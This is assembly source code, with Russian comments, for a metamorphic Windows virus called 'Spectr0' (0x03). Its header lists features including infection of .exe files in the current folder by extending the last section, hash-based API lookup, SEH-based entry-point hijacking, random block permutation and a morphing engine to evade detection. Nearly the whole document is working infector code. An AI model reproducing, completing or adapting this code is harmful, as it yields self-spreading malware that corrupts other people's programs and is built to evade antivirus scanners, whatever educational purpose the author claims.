;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                ;
;                                                                                                ;
;                   ########                      ########        ########                       ;
;                  ##########                    ##########      ##########                      ;
;                 ##        ##                  ##        ##              ##                     ;
;                 ##        ##                  ##        ##              ##                     ;
;                 ##        ##    ##      ##    ##        ##              ##                     ;
;                 ##        ##     ##    ##     ##        ##       ########                      ;
;                 ##        ##      ##  ##      ##        ##       ########                      ;
;                 ##        ##       ####       ##        ##              ##                     ;
;                 ##        ##       ####       ##        ##              ##                     ;
;                 ##        ##      ##  ##      ##        ##    ##        ##                     ;
;                  ##########      ##    ##      ##########     ###########                      ;
;                   ########      ##      ##      ########       #########                       ;
;                                                                                                ;
;                                                                                                ;                                                                                  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                ;
;											:)                                                   ;
;                                                                                                ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                ;
;				    					ВИРУС 0x03 (он же Spectr0)                                               ;
;                                                                                                ;
;				       					   ТЕМЫ:                                                 ;
;                                                                                                ;
;(+) Простой метаморфинг (о нем читай в движке spectr.asm)                                       ;
;(+) Рандомная Перестановка блоков кода                                                          ;
;(+) Поиск адреса Kernel32 (через SEH)                                                           ;
;(+) Поиск адресов апишек по хэшам                                                               ;
;(+) Инфект РЕ-файлов (*.exe)                                                                    ;
;(+) Не изменяется время последней модификации файлов                                            ;
;(+) Не изменяются атрибуты файлов                                                               ;
;(+) Не изменяются атрибуты секций в жертве                                                      ;
;(+) Полезная нагрузка (вызов мессаги:)                                                          ;
;(+) Не перебивается точка входа (по адресу, куда она указывает, торчит SEH)                     ;                      
;                                                                                                ;                                        
;(-) Не оптимизирован                                                                            ;
;(-) Изменяется размер файла                                                                     ;
;                                                                                                ;
;(x) Прошел проверку на ОС Windows XP SP2, на других не тестил.                                  ;
;                                                                                                ;
;				    					Версия 3.5                                               ;
;                                                                                                ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;              
;                                                                                                ;
;                                                                                                ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                ;
;				     					ДОПОЛНЕНИЕ:                                              ;
;                                                                                                ;
;1) Инфект файлов происходит только в текущей папке.                                             ;
;2) Данный вирус инфектит файлы методом расширения последней секции.                             ;
;3) Вирус создан в образовательных целях + саморазвития.                                         ;
;4) Вирус создан как полигон для разных движков (работоспособности, находки багов,               ;
;   фичей, etc:)                                                                                 ;
;5) Данный вирек был написан специально для проверки правильной работоспособности движка         ;
;	SPECTR. Т.к. этот движок понимает не все команды, а также для проверки других команд,        ;
;	данный код неоптимизирован. Многие лишние команды были написаны специально для проверки      ;
;	данного движка.                                                                              ;
;6) Для этого движка специально немного переделан дизасм LiTo.                                   ;
;7) Кому надо, тестируйте тщательней.                                                            ; 
;                                                                                                ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
                             


																			;m1x
																	 ;pr0mix@mail.ru	





.386
.model flat, stdcall
option casemap:none

include windows.inc;\masm32\include\windows.inc
include kernel32.inc;\masm32\include\kernel32.inc

includelib kernel32.lib;\masm32\lib\kernel32.lib


.code
;------------------------------------------------------------------------------------------------
AddrIsklComand:											;Табличка Исключений (ТИ)
	dd		HashTable1        -start                    ;как видно, здесь используются не адреса, 
	dd		SizeHashTable1                              ;а смещения относительно точки входа в прогу
	dd		_isklvir1_		  -start                    ;значения должны идти в порядке возрастания
	dd		Sizeisklvir1
	dd		szVNA             -start
	dd		SizeszVNA
	dd		_isklvir2_		  -start
	dd		Sizeisklvir2
	dd		_iskl1_           -start
	dd		Sizeiskl1
	dd		_iskl2_           -start
	dd		Sizeiskl2
	dd		_iskl8_           -start
	dd		Sizeiskl8
	dd		Buf2              -start
	dd		SizeBuf2
	dd		RANG32            -start
	dd		SizeRANG32
	dd		pfx				  -start
	dd		SizePfx
	dd		TableFlags1		  -start
	dd		SizeTbl
	dd		_isklspectr0_	  -start
	dd		Sizeiskspectr0
	dd		_isklspectr1_	  -start
	dd		Sizeiskspectr1
	dd		_isklspectr2_	  -start
	dd		Sizeiskspectr2
	dd		_isklspectr3_	  -start
	dd		Sizeiskspectr3
	dd		_isklspectr4_	  -start
	dd		Sizeiskspectr4
	dd		_iskl9_           -start
	dd		Sizeiskl9
	dd		_iskl10_           -start
	dd		Sizeiskl10
	dd		_iskl11_           -start
	dd		Sizeiskl11	
	dd		_isklvir3_		  -start
	dd		Sizeisklvir3
	dd		_isklvir4_		  -start
	dd		Sizeisklvir4
	dd		_iskl3_           -start
	dd		Sizeiskl3	
	dd		_isklvir5_		  -start
	dd		Sizeisklvir5
	dd		_isklvir6_		  -start
	dd		Sizeisklvir6
	dd		_isklvir7_		  -start
	dd		Sizeisklvir7
	dd		_isklvir8_		  -start
	dd		Sizeisklvir8
	dd		szUser32          -start
	dd		SizeszUser32
	dd		_iskl4_           -start
	dd		Sizeiskl4
	dd		szMessageBoxA     -start
	dd		SizeszMessageBoxA
	dd		_iskl5_           -start
	dd		Sizeiskl5
	dd		_iskl6_           -start
	dd		Sizeiskl6
	dd		_iskl7_           -start
	dd		Sizeiskl7
	dd		_isklvir9_		  -start
	dd		Sizeisklvir9

	;dd		_isklvir10_		  -start
	;dd		Sizeisklvir10																				

	dw		0ffffh										;конец ТИ
SizeAddrIsklComand	equ		$-AddrIsklComand            ;размер ТИ
;------------------------------------------------------------------------------------------------


;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;x                                                                                  ###         x
;x                                                                                 #####        x
;x            ######     ####     ######    #    #     ###      ###     #   #      #####        x
;x            #    #    #    #    #          #  #     #   #    #   #    #  ##      #####        x
;x            #    #    #    #    #####       ##      #####    #   #    # # #       ###         x
;x            #    #    #    #    #          #  #     #   #    #   #    ##  #                   x
;x            #    #     ####     ######    #    #    #   #   #    #    #   #       ###         x
;x                                                                                  ###         x
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

start:
	assume	fs:flat
	call	_START_										;переходим
	;CallFunc	eax,ecx,edx,'8'                         ;оставим такой call (для разнообразия:)!

;================================================================================================			                           
;вспомогательные переменные
;================================================================================================

;================================================================================================

;------------------------------------------------------------------------------------------------

pushz	macro szText:VARARG             				;макрос для создания строки
	local	l1                                          ;и получения в стеке ее адреса
	call	l1                                          ;в общем, как всегда - все смотрим в исходник + отладчик:)!
	db		szText,0                                    ;в этом вирьке не используется
l1:
endm
;------------------------------------------------------------------------------------------------

CallFunc	macro reg1,reg2,tmp1,tmp2                   ;поиск (и вызов) функций по маркерам
	local	_metka1_
	mov		reg1,tmp1
	push	reg2
	mov		reg2,'iriu'
	inc		reg2
_metka1_:
	inc		reg1
	cmp		reg2,dword ptr [reg1]
	jne		_metka1_
	cmp		byte ptr [reg1+4],tmp2;'5'
	jne		_metka1_
	pop		reg2
	add		reg1,5
	call	reg1
endm

;------------------------------------------------------------------------------------------------
InitData:                                               ;инициализированные данные	
	dwEntry					equ	dword ptr [ebp+4*1]     ;здесь будет храниться адрес самой первой команды (ака точка входа)
	delta					equ	dword ptr [ebp]         ;хдесь хранится дельта-смещение
														;в этом вирьке она почти не задействована
;------------------------------------------------------------------------------------------------
Func1:                                                  ;здесь будут храниться адреса нужных апишек
	_fCreateFileA			equ	dword ptr [ebp-4*4]     ;смотри по названиям:)
	_fCreateFileMappingA	equ	dword ptr [ebp-4*5]
	_fMapViewOfFile   		equ	dword ptr [ebp-4*6]
	_fUnmapViewOfFile  		equ	dword ptr [ebp-4*7]
	_fCloseHandle     		equ	dword ptr [ebp-4*8]
	_fFindFirstFileA   		equ	dword ptr [ebp-4*9]
	_fFindNextFileA      	equ	dword ptr [ebp-4*10]
	_fSetFileAttributesA  	equ	dword ptr [ebp-4*11]
	_fGetCurrentDirectoryA	equ	dword ptr [ebp-4*12]
	_fLoadLibraryA       	equ	dword ptr [ebp-4*13]
	_fGetProcAddress     	equ	dword ptr [ebp-4*14]
	_fSetFileTime     		equ	dword ptr [ebp-4*15]
	_fVirtualProtect		equ	dword ptr [ebp-4*16]
	_fSetFilePointer		equ dword ptr [ebp-4*17]
	_fSetEndOfFile			equ dword ptr [ebp-4*18]
	_fVirtualAlloc			equ dword ptr [ebp-4*19]
	_fVirtualFree			equ dword ptr [ebp-4*20]
	
	_fMessageBoxA			equ	dword ptr [ebp-4*21]
;------------------------------------------------------------------------------------------------
	                                                 	;22 - hFindFile
	                                                 	;24 - ret address
	                                                 	;23 - OEP	                                                 	
	                                                 	;25 - eax	                                                 	
	                                                 	;26 - esi
;------------------------------------------------------------------------------------------------
    szPath					equ	dword ptr [ebp-4*27]    ;путь к жертве:)!
	pExe					equ	dword ptr [ebp-4*28]    ;mapped address
	EntryPoint				equ	dword ptr [ebp-4*29]    ;AddressOfEntryPoint
	pEntryPoint				equ	dword ptr [ebp-4*30]    ;address AddressOfEntryPoint
	pSizeOfImage			equ	dword ptr [ebp-4*31]    ;адрес SizeOfImage
	Base					equ	dword ptr [ebp-4*32]    ;ImageBase
	FA						equ	dword ptr [ebp-4*33]    ;FileAlignment
	pRSizeOfLastSec			equ	dword ptr [ebp-4*34]    ;address SizeOfRawData LastSection (LS) 
	pVSizeOfLastSec			equ	dword ptr [ebp-4*35]    ;address VirtualSize LS
	pCharacters				equ	dword ptr [ebp-4*36]    ;address Characteristics LS
	RSizeOfLastSec			equ	dword ptr [ebp-4*37]    ;SizeOfRawData LS
	VSizeOfLastSec			equ	dword ptr [ebp-4*38]    ;VirtualSize LS
	VirtAddr				equ dword ptr [ebp-4*39]    ;VirtualAddress LS
	CorVirSize              equ dword ptr [ebp-4*40]	;сохраняем размер полученного  отмутированного кода
	AddrShifrCode           equ dword ptr [ebp-4*41]    ;сохраняем адрес полученного  отмутированного кода
	tmpAddrTblIskl			equ	dword ptr [ebp-4*42]    ;вспомогательная переменная для хранения адреса ТИ в другом буфере (смотри исходник)
		
	wfdChgFileSize			equ dword ptr [ebp+4*2+20h]	;wfd.nFileSizeLow

;ж===============================================================================================

;+-----------------------------------------------------------------------------------------------

HashTable1:												; Таблица хешей Kernel32
	dd	0860b38bch          							;CreateFileA
	dd	01F394C74h										;CreateFileMappingA
	dd	0FC6FB9EAh       								;MapViewOfFile
	dd	0CA036058h       								;UnmapViewOfFile
	dd	0F867A91Eh       								;CloseHandle
	dd	03165E506h       								;FindFirstFileA
	dd	0CA920AD8h       								;FindNextFileA
	dd	0152DC5D4h    									;SetFileAttributesA
	dd	02F597DD6h       								;GetCurrentDirectoryA
	dd	071E40722h       								;LoadLibraryA
	dd	05D7574B6h 										;GetProcAddress
	dd	0a2d2cb0ch										;SetFileTime
	dd	015f8ef80h										;VirtualProtect
	dd  07f3545c6h										;SetFilePointer
	dd  0059c5e24h										;SetEndOfFile
	dd  019bc06c0h										;VirtualAlloc
	dd	0ea43a878h										;VirtualFree
	
	dw	0ffffh                                          ;конец таблички хешей:)
;------------------------------------------------------------------------------------------------

BytesForSEH			db		20 dup (00h)  

ChgVirSize			dd		VirusSize
;------------------------------------------------------------------------------------------------
Bat:                                                    ;Block Address Table (вспомогательная Табличка Адресов Блоков:)!
	dd	Play
	dd	InfectFiles
	dd	rep_movsb
	dd	fnOpenFile
	dd	ValidPE
	dd	GetKernelSEH
	dd	GetGetProcAddress
	dd	_START_
	dd	_isklvir9_
	;dd	_isklvir10_
	dw	0ffffh
SizeBat				equ		$-Bat

;------------------------------------------------------------------------------------------------

OldBytes			db 		5 dup(00h)					;буфер для хранения 5 байт в районе точки входа жертвы
dwOEP				dd 		00h                         ;OEP жертвы:)!

;------------------------------------------------------------------------------------------------
SizeHashTable1		equ		$-HashTable1				;размер таблички хэшей





_isklvir1_:                                             ;вспомогательные маркеры - с их помощью мы будем искать адреса наших функций
db	'viri','1'
Sizeisklvir1	equ		$ - _isklvir1_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция Play
;вызов мессаги бокса:)!
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Play:
	pushad
	push	0
	call	_addrszVNA_
szVNA			db '0x03 by m1x! Privet! Ya prisol s mirom!',0 ;Virus Name & Autor
SizeszVNA		equ		$-szVNA

_addrszVNA_:	
	push	dword ptr [esp]
	push	0
	call	_fMessageBoxA                             	;и светим мессагу:)!
	popad
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции Play
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





_isklvir2_:
db	'viri','2'
Sizeisklvir2	equ		$ - _isklvir2_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция InfectFiles
;инфект exe-шек (РЕ-файликов) методом расширения последней секции
;Вход:
;edi - путь к жертве (пример: "C:\Games\Sacrifice.exe")
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
InfectFiles:
	push	eax                                         ;Сохраняем регистры
	push	esi

	pushad
	push	FILE_ATTRIBUTE_NORMAL
	push	edi
	call	_fSetFileAttributesA						;ставим такие атрибуты, чтобы можно было открыть + для write
	popad
	push	edi;szPath                                  ;сохраняем путь                                
;------------------------------------------------------------------------------------------------

	CallFunc	eax,ecx,dwEntry,'4' 					;находим и вызываем нашу функцию fnOpenFile (открываем жертву)
	
	inc		eax
	je		_error2_
	dec		eax
;------------------------------------------------------------------------------------------------
	mov		edi,wfdChgFileSize							;wfd.nFileSizeLow

	
	;mov		edx,dwEntry
	;add		edx,5+SizeHashTable1-4-5-SizeBat-4
	;mov		edx,dword ptr [edx]	

	mov		edx,VirusSize                           ;new_size=ALIGN_UP(OldSize+VirusSize,FileAlignment)
	mov		ecx,1000h                                   ;#define ALIGN_UP (x,y) ((x+(y-1))&(~(y-1)))
	dec		ecx                                         ;делаем FileAlignment=1000h
	add		edx,ecx                                     ;так как мы еще не знаем FileAlignment, 
	not		ecx                                         ;поэтому выделяем размер с запасом:)!
	and		edx,ecx
	add		edi,edx
;------------------------------------------------------------------------------------------------
	xchg	eax,esi
	
	push	eax
	pushad
	push	ebx
	push	edi
	push	ebx
	push	PAGE_READWRITE
	push	ebx
	push	esi
	call	_fCreateFileMappingA     					;создаем проекцию файла
_iskl1_:                                                ;очередное исключение для нашего движка:)!
	mov		dword ptr [esp+20h],eax
Sizeiskl1	equ		$ - _iskl1_
	popad
	pop		eax
	
	test	eax,eax
	jne		_map_
;------------------------------------------------------------------------------------------------
	pushad
	push	esi
	call	_fCloseHandle             					;если косяк, закрываем хэндл
	popad
	jmp		_error2_
;------------------------------------------------------------------------------------------------
_map_:
	xchg	eax,edi
	
	push	eax
	pushad
	push	ebx
	push	ebx
	push	ebx
	push	FILE_MAP_ALL_ACCESS
	push	edi
	call	_fMapViewOfFile  							;мэпим
_iskl2_:
	mov		dword ptr [esp+20h],eax                     ;еще одно исключение
Sizeiskl2	equ		$ - _iskl2_
	popad
	pop		eax
	
	xchg	edi,eax
;------------------------------------------------------------------------------------------------
	pushad
	push	esi
	push	eax
	call	_fCloseHandle                             	;закрываем уже ненужные хэндлы
	call	_fCloseHandle
	popad
	test	edi,edi
	je		_error2_
;------------------------------------------------------------------------------------------------
	xchg	eax,edi
	push	eax;pExe                                    ;сохраняем базу мэппинга                           	

	CallFunc	edx,ecx,dwEntry,'5'	 					;call	ValidPE
	                                                    ;вообще, это РЕ-файл?
	test	edx,edx
	je		_error_
	cmp		word ptr [eax+34h],'sr'                     ;Заражен ли он уже нашим зверьком?
	je		_error_
;хххххххххххххххххххххххххххххххBEG разбор заголовковхххххххххххххххххххххххххххххххxxxxxxxxxxxxx
	xchg	esi,eax
	assume	esi:ptr IMAGE_DOS_HEADER
	add		esi,[esi].e_lfanew
	add		esi,4
	;lodsd
	assume	esi:ptr IMAGE_FILE_HEADER
	movzx	ecx,[esi].NumberOfSections
	test	ecx,ecx                      				;есть ли вообще секции?
	je		_error_
	add		esi,sizeof IMAGE_FILE_HEADER
	assume	esi:ptr IMAGE_OPTIONAL_HEADER
	push	[esi].AddressOfEntryPoint      				;получаем точку входа
	;EntryPoint
	lea		eax,[esi].AddressOfEntryPoint               ;получаем адрес точки входа
	push	eax;pEntryPoint                             ;etc
	lea		eax,[esi].SizeOfImage
	push	eax;pSizeOfImage
	push	[esi].ImageBase
	;Base
	push	[esi].FileAlignment
	;FA
	add		esi,sizeof IMAGE_OPTIONAL_HEADER
	assume	esi:ptr IMAGE_SECTION_HEADER
	xor		edx,edx
	sub		esp,4*5                                     ;выделяем еще место в стэке для временных переменных
;хххххххххххххххххххххххBEG разбор IMAGE_SECTION_HEADERхххххxхххххххххххххххххххххххxxxxxxxxxxxxx
_cycle_:                                                ;в edx - PointerToRawData
                                                        ;в ebx - VirusAddress
                                                        ;в ecx - кол-во секций в жертве
	cmp		edx,[esi].PointerToRawData 					;находим последнюю секцию виртуально и физически
	jg		_nc_                                        ;а также собираем нужную инфу
	cmp		ebx,[esi].VirtualAddress
	jg		_nc_
	lea		eax,[esi].SizeOfRawData
	mov		[esp+4*4],eax
	;mov		[pRSizeOfLastSec+ebp],eax ;!!!!!!!!!!!!!!!
	lea		eax,[esi].Misc.VirtualSize
	mov		[esp+4*3],eax
	;mov		[pVSizeOfLastSec+ebp],eax ;!!!!!!!!!!!!!!!
	lea		eax,[esi].Characteristics
	mov		[esp+4*2],eax
	;mov		[pCharacters+ebp],eax   ;!!!!!!!!!!!!!!!
	mov		edx,[esi].PointerToRawData
	mov		ebx,[esi].VirtualAddress
	mov		eax,[esi].SizeOfRawData
	mov		[esp+4*1],eax
	mov		eax,[esi].Misc.VirtualSize
	mov		[esp],eax
;------------------------------------------------------------------------------------------------
                                                        ;здесь нам нужно определить, в какой секции расположена точка входа, 
	mov		eax,EntryPoint                              ;а также посчитать физический адрес самой первой выполняемой инструкции в жертве
	cmp		eax,ebx
	jb		_nc_
	mov		edi,ebx
	add		edi,[esi].Misc.VirtualSize
	cmp		eax,edi
	ja		_nc_
	sub		eax,ebx                                     ;если нашли, то считаем нужный адрес:)!
	add		eax,edx
	add		eax,pExe
	xchg	eax,edi

_nc_:
	add		esi,sizeof IMAGE_SECTION_HEADER
	dec		ecx
	jne		_cycle_
;хххххххххххххххххххххххEND разбор IMAGE_SECTION_HEADERхххххxхххххххххххххххххххххххxxxxxxxxxxxxx
;хххххххххххххххххххххххххххххххEND разбор заголовковхххххххххххххххххххххххххххххххxxxxxxxxxxxxx
	push	ebx                                         ;сохраняем VirtualAddress
	sub		esp,12                                      ;выделяем еще места для временных переменных

	mov		eax,RSizeOfLastSec                          ;eax - SizeOfRawData
	test	eax,eax                                     ;если физический размер последней секции=0, то капец:(
	je		_error_

	cmp		eax,VSizeOfLastSec 							;затем смотрим, содержит ли последняя секция иниц-ые данные 
	jl		_error_

	;mov	eax,pCharacters;                            ;eax - Characteristics address
	;test 	byte ptr [eax+3],IMAGE_SCN_CNT_UNINITIALIZED_DATA;хвост секции содержит данные, иниц. нулями
	;jnz 	_error_
;------------------------------------------------------------------------------------------------

;------------------------------------------------------------------------------------------------
    pushad                                              ;так мы сохраняем все регистры перед каждым вызовом апишек

	push	eax
	pushad	
	push	PAGE_READWRITE
	push	MEM_RESERVE + MEM_COMMIT
	push	SizeSPECTRCode
	push	0
	call	_fVirtualAlloc								;выделяем память для хранения отмутированного кода (с запасом)
_iskl8_:
	mov		dword ptr [esp+20h],eax                     ;очередной адрес - исключение

Sizeiskl8	equ		$ - _iskl8_
	popad
	pop		eax

	mov		tmpAddrTblIskl,eax                          ;сохраним адрес для ТИ

;------------------------------------------------------------------------------------------------

	push	edi                                         
	xchg	eax,edi   	   	
   	mov		esi,dwEntry      
	add		esi,5+SizeHashTable1-4-5-SizeBat-4-20     
	push	20
	pop		ecx
	push	esi                      
	push	ecx

	CallFunc	eax,ecx,dwEntry,'3'	 					;call	rep_movsb
	                                                    ;для начала сохраним байты (5 байт) для восстановления кода 	                                
	pop		ecx
	pop		esi                      
	pop		edi
;------------------------------------------------------------------------------------------------
	push	edi
	push	ecx
	xchg	edi,esi

	CallFunc	eax,ecx,dwEntry,'3'  					;call	rep_movsb	 
	                                                    ;теперь запишем первые 5 байт жертвы (те, что в районе точки входа) в буфер
	pop		ecx
	pop		edi
;------------------------------------------------------------------------------------------------
	call	_addrSEH_
_SEH_:
	xor		eax,eax
	push	12345678h
	push	dword ptr fs:[eax]
	mov		dword ptr fs:[eax],esp
	div		eax
SizeSEH		equ		$ - _SEH_		
_addrSEH_:	
	pop		ebx
	mov		eax,VirtAddr                                ;далее, запишем вместо этих 5 байт jmp на наш будущий код:)!
	add		eax,RSizeOfLastSec                          ;для этого посчитаем операнд джампа: формула такая:
	add		eax,SizeAddrIsklComand;-5                    ;x-y-5=operand
	add		eax,Base
	mov		dword ptr [ebx+3],eax
	mov		ecx,20;SizeSEH
_rmb0_:
	mov		al,byte ptr [ebx]
	mov		byte ptr [edi],al
	inc		edi
	inc		ebx
	dec		ecx
	jne		_rmb0_

	
	;sub		eax,EntryPoint                              ;x - адрес, куда надо прыгнуть; y - адрес, где находится этот самый jmp
	                                   					;5 - байт весит этот джамп (near jmp)
	;mov		byte ptr [edi],0E9h                         ;запишем опкод джампа
	;mov		dword ptr [edi+1],eax		                ;и уже правильно посчитанный операнд джампа
	
	mov		edi,tmpAddrTblIskl                          ;теперь прибавим +5 (так как мы сохранили там 5 байт жертвы)
	add		edi,20

	mov		edx,edi
;------------------------------------------------------------------------------------------------
	mov		eax,EntryPoint                      		;сохраним OEP жертвы
	add		eax,Base
	mov		ebx,dword ptr [ebp-4*25]
	mov		dword ptr [ebx],eax
;------------------------------------------------------------------------------------------------
	mov		esi,dwEntry                                 ;теперь скопируем ТИ в выделенный буфер
	mov		ecx,SizeAddrIsklComand
	sub		esi,ecx

	CallFunc	eax,ecx,dwEntry,'3'	 					;call	rep_movsb
;------------------------------------------------------------------------------------------------
	push	eax                                         ;
	push	eax
	pushad                                              ;сохраняем все регистры перед вызовом функции
	push	edx                                         ;кладем в смтэк адрес ТИ         
	call	@F                                          ;и адрес буфера под дизасм       
;-----------------------------------------------------------------------------------------
Buf2		db 100h dup (00h)                           ;буфер для разобранной дизасмом  ;    
SizeBuf2	equ		$ - Buf2                            ;команды                         ;
;-----------------------------------------------------------------------------------------
@@:
	push	edi                                         ;и адрес буфера под отмутированный код
	push	dwEntry	                                    ;и адрес кода, который надо проморфить

	;mov		edx,dwEntry
	;add		edx,5+SizeHashTable1-4-5-SizeBat-4	
	;push	dword ptr [edx]

	push	VirusSize                                   ;и размер вирька ( с запасом - т.к. он после морфинга увеличится)
	call	@F                                          ;и адрес ГСЧ
;-----------------------------------------------------------------------------------------
include		rang32.asm                                  ;ГСЧ                             ;          
;-----------------------------------------------------------------------------------------	
@@:
	call	_gospectr_	                                ;и адрес дизасма
;-----------------------------------------------------------------------------------------
include		_lito_.asm                                  ;ДИЗАССЕМБЛЕР                    ;
;-----------------------------------------------------------------------------------------
include		spectr.asm                                  ;SIMPLE MORHPER                  ;
;-----------------------------------------------------------------------------------------
	
_gospectr_:	
	call	SPECTR										;НУ ВОТ, НАКОНЕЦ-ТО, ВЫЗЫВАЕМ НАШ ПРОСТОЙ МОРФЕР!
;------------------------------------------------------------------------------------------------
_iskl9_:
	sub		edi,SizeAddrIsklComand                      ;скорректируем адрес
	add		eax,SizeAddrIsklComand                      ;и размер
	mov		dword ptr [esp+20h],eax
	mov		dword ptr [esp+24h],edi
Sizeiskl9	equ		$ - _iskl9_
	popad
	pop		eax
	pop		edi
	mov		CorVirSize,eax                				;сохраняем размер полученного отмутированного кода
	mov		AddrShifrCode,edi                         	;сохраняем адрес полученного отмутированного кода
	
	mov		edx,dwEntry
	add		edx,5+SizeHashTable1-4-5-SizeBat-4
	mov		dword ptr [edx],eax	


;------------------------------------------------------------------------------------------------

;xxxxxxxxxxxxxxxxxxxxxxxxxxxBEG ПЕРЕСТАНОВКА БЛОКОВxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

                                                        ;теперь, переставим блоки в отмутированном коде
	                                                    ;это можно было сделать и без такого гимора, но я оставил так, как есть:)!
	
;------------------------------------------------------------------------------------------------
	lea		eax,[edi+eax]                               ;для начала найдем в этом коде адреса блоков (функций), которые будем переставлять
	mov		ebx,'iriu'                                  ;искать будем по нашим маркерам
	inc		ebx
	xor		ecx,ecx
	lea		esi,dword ptr [edi+SizeAddrIsklComand+5+SizeHashTable1-4-5-SizeBat]
	push	edi
_nxtmarker_:
	cmp		ebx,dword ptr [edi]                         ;найден ли маркер?
	jne		@F
	mov		dword ptr [esi+ecx*4],edi                   ;если да, то сохраним во временном буфере его адрес (то есть адрес очередного блока)
	inc		ecx
@@:
	inc		edi
	cmp		edi,eax                                     ;и так до конца кода
	jb		_nxtmarker_
	pop		edi		
	xor		ecx,ecx

;------------------------------------------------------------------------------------------------
_nxtrndnum_:	                                        ;далее, перемешаем найденные адреса в случайном порядке
	push	eax
	pushad

_iskl10_:	
	push	(SizeBat-2)/4-1								;отнимаем -1 потому, что последний блок мы записывать не будем! (т.к. там мусор:)!
	pop		eax
Sizeiskl10	equ		$ - _iskl10_
	
	call	RANG32                                      ;ГСЧ
_iskl11_:
	mov		dword ptr [esp+20h],eax                     ;еще одно исключение
Sizeiskl11	equ		$ - _iskl11_
	popad
	pop		eax
	
	mov		edx,dword ptr [esi+eax*4]
	push	dword ptr [esi+ecx*4]
	pop		dword ptr [esi+eax*4]
	mov		dword ptr [esi+ecx*4],edx
	inc		ecx
	cmp		ecx,(SizeBat-2)/4-1
	jne		_nxtrndnum_
;------------------------------------------------------------------------------------------------

	mov		edx,edi                                     ;далее, сначала запишем (не переставляя) ТИ + 5 байт (call) + табличку хэшей
	add		edx,CorVirSize
	mov		ecx,SizeAddrIsklComand+5+SizeHashTable1
_rmb1_:
	mov		al,byte ptr [edi]
	mov		byte ptr [edx],al
	inc		edi
	inc		edx
	dec		ecx
	jne		_rmb1_
;------------------------------------------------------------------------------------------------
		                                                ;продолжаем; т.к. мы перемешали рандомно адреса блоков, то 
	mov		edi,AddrShifrCode                           ;теперь по очереди запишем эти блоки
	mov		edx,edi
	add		edi,CorVirSize
	add		edi,SizeAddrIsklComand	
	push	edi;										;это типа должно быть dwEntry только в новом буфере:)!
	add		edi,SizeHashTable1+5
	
_nxtaddr_:	
	push	ebx
	push	esi
	push	edi	
	mov		esi,dword ptr [esi]
	cmp		byte ptr [esi+4],'8'                        ;смотрим, это блок _START_ ?
	jne		_rmb2_
	mov		eax,dword ptr [esp+12]                      ;если да, то нам надо также исправить операнд call'а, который вызывает данный блок:)! 
	mov		ecx,edi
	sub		ecx,eax
	mov		dword ptr [eax+1],ecx
_rmb2_:
	mov		al,byte ptr [esi]
	mov		byte ptr [edi],al
	inc		esi
	inc		edi
	cmp		ebx,dword ptr [esi]
	jne		_rmb2_
;------------------------------------------------------------------------------------------------
                                                        ;далее, так как теперь блоки записаны по новым адресам, то 
	mov		ebx,[esp+4]                                 ;в нашей табличке исключений (ТИ) также должны быть изменены адреса исключений, 
	xor		ecx,ecx                                     ;соответствующие блокам
_nxtoffset_:
	mov		eax,[edx+ecx*8]
	add		eax,[esp+12]								;!!!!! optimization!
	sub		eax,CorVirSize
	
	cmp		eax,dword ptr [ebx]                         ;тут мы проверяем, принадлежит ли очередной адрес из ТИ только что записанному блоку?
	jb		@F
	cmp		eax,esi
	jae		@F
	                                                    ;если да, то 
	push	ecx                                         ;посчитаем его смещение (об этом читай выше) для нового буфера
	mov		ecx,esi
	sub		ecx,eax
	mov		eax,edi
	sub		eax,ecx
	sub		eax,[esp+12+4]
	pop		ecx
	push	ecx

	lea		ecx,dword ptr [edx+ecx*8]
	add		ecx,CorVirSize
	mov		dword ptr [ecx],eax                        ;и сохраним его в ТИ
	pop		ecx
@@:
    inc		ecx                                        ;идем к следующему адресу в Табличке Исключений (ТИ)
    cmp		ecx,(SizeAddrIsklComand-2)/8
    jne		_nxtoffset_
